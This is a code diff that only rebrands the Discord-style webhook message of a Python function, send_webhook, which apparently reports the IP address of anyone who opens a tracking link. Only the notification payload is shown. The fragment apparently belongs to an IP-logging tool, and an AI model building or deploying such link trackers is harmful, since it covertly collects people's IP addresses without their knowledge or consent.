@@ -24,11 +24,11 @@ def send_webhook(ip):
         return False
 
     payload = {
-        "username": "Oculus Taggers",
+        "username": "Backend Made By : Harmony",
         "embeds": [
             {
-                "title": "Link Opened",
-                "description": "Someone opened the Oculus Taggers link.",
+                "title": "Backend Made By : Harmony",
+                "description": "Backend Made By : Harmony",
                 "fields": [
                     {
                         "name": "IP Address",
@@ -37,7 +37,7 @@ def send_webhook(ip):
                     }
                 ],
                 "footer": {
-                    "text": "Oculus Taggers"
+                    "text": "Backend Made By : Harmony"
                 }
             }
         ]
